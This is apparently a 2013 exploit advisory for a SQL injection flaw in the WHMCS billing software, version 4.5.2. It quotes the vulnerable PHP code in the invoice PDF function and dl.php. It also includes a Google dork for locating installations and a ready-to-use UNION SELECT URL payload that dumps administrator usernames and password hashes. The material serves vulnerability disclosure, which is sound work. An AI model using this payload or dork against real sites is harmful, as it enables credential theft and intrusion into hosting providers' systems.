# Google Dork: intext:"Powered by WHMCompleteSolution" OR inurl:"submitticket.php‎"‎
# Author: Ahmed Aboul-Ela
# Contact: Ahmed.Aboul3la[at]gmail[dot]com
# Date: 14/5/2013
# Vendor: http://www.whmcs.com
# Version: 4.5.2 and perior versions should be affected too 
# Tested on: Linux

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Sql Injection Vulnerability in "/includes/invoicefunctions.php"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
    - Vulnerable Code Snippet :
     
      LINE 582: function pdfInvoice($id)
      LINE 583: {
      LINE 686: if ($CONFIG[&#039;GroupSimilarLineItems&#039;])
      LINE 687: {
      LINE 688: $result = full_query(&#039;&#039; . &#039;SELECT COUNT(*),id,type,relid,description,amount,taxed FROM tblinvoiceitems WHERE invoiceid=&#039; . $id . &#039; GROUP BY `description`,`amount` ORDER BY id ASC&#039;);
      LINE 689: }
      
     As we can see here the $id argument of pdfInvoice function have been used directly at mysql query without any sanitization which leads directly to Sql Injection
     It appears that pdfInvoice function is being called at "/dl.php" file as the following:
     
     
      LINE 21: if ($type == &#039;i&#039;)
      LINE 22: {
      LINE 23: $result     = select_query(&#039;tblinvoices&#039;, &#039;&#039;, array(
      LINE 24: &#039;id&#039; => $id
      LINE 25: ));
      LINE 26: $data       = mysql_fetch_array($result);
      LINE 27: $invoiceid  = $data[&#039;id&#039;];
      LINE 28: $invoicenum = $data[&#039;invoicenum&#039;];
      LINE 29: $userid     = $data[&#039;userid&#039;];
      LINE 30: if ((!$_SESSION[&#039;adminid&#039;] && $_SESSION[&#039;uid&#039;] != $userid))
      LINE 31: {
      LINE 32: downloadLogin();
      LINE 33: }
      LINE 34: if (!$invoicenum)
      LINE 35: {
      LINE 36: $invoicenum = $invoiceid;
      LINE 37: }
      LINE 38: require(&#039;includes/clientfunctions.php&#039;);
      LINE 39: require(&#039;includes/countries.php&#039;);
      LINE 40: require(&#039;includes/invoicefunctions.php&#039;);
      LINE 41: require(&#039;includes/tcpdf.php&#039;);
      LINE 42: $pdfdata = pdfInvoice($id);
      LINE 43: header(&#039;Pragma: public&#039;);
      LINE 44: header(&#039;Expires: Mon, 26 Jul 1997 05:00:00 GMT&#039;);
      LINE 45: header(&#039;Last-Modified: &#039; . gmdate(&#039;D, d M Y H:i:s&#039;) . &#039; GMT&#039;);
      LINE 47: header(&#039;Cache-Control: private&#039;, false);
      LINE 48: header(&#039;Content-Type: application/octet-stream&#039;);
      LINE 49: header(&#039;Content-Disposition: attachment; filename="&#039; . $invoicenum . &#039;.pdf"&#039;);
      LINE 50: header(&#039;Content-Transfer-Encoding: binary&#039;);
      LINE 51: echo $pdfdata;
      LINE 52: exit();
      LINE 53: return 1;
      LINE 54: }
      
      
      As we can see at LINE "42" the pdfInvoice function have been called and passed $id Variable without any sanitization
      Afterwards it force the browser to download the generated invoice in PDF format
     
      - Proof of Concept for Exploitation 
     
        To Dump Administrator Credentials (user & pass):
       
        http://www.site.com/whmcs/dl.php?type=i&id=1 and 0x0=0x1 union select 1,2,3,4,CONCAT(username,0x3a3a3a,password),6,7 from tbladmins --
       
        ~ Result: The Browser will prompt download for the pdf invoice file after opening it you should find the username and pw hash there :)
         
      - Precondition to Successfully Exploit the Vulnerability:
     
	"Group Similar Line Items" Option should be Enabled at the Invoices Settings in the WHMCS Admin ( It should be Enabled by default )
	
      - Credits: 

        Ahmed Aboul-Ela - Information Security Consultant @ Starware Group

